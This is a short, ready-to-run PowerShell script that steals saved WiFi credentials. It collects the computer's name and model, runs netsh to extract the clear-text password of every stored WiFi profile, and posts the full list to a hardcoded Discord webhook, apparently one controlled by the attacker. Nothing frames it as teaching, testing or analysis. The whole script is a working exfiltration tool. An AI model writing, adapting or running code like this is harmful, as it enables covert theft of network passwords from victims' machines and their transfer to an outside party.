# Define your webhook URL and the message string
$WebhookUrl = "https://discord.com/api/webhooks/1522586603615162469/cSzV4hP6LxzHVQKQjOH7ZKAjKSL9Dd_dXSzbSzViTz-DvlS2C1J7aSZkG3tD871SCXwY"

$cs = Get-CimInstance Win32_ComputerSystem
$model = $cs.Model
$deviceName = $env:COMPUTERNAME
$Message = "`n--- $deviceName $model ---"

$profiles = netsh wlan show profiles |
    Select-String "All User Profile" |
    ForEach-Object {
        $_.Line.Split(":")[1].Trim()
    }

$Message += "`nWiFi Data:"
    
foreach ($profileName in $profiles) {
    $profileInfo = netsh wlan show profile name="$profileName" key=clear

    $password = ($profileInfo |
        Select-String "Key Content").Line.Split(":")[1].Trim()

    $Message += "`n$profileName - $password"
}

# Package the message into the standard Discord JSON format
$Body = @{
    content = $Message
} | ConvertTo-Json

# Send it to Discord
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
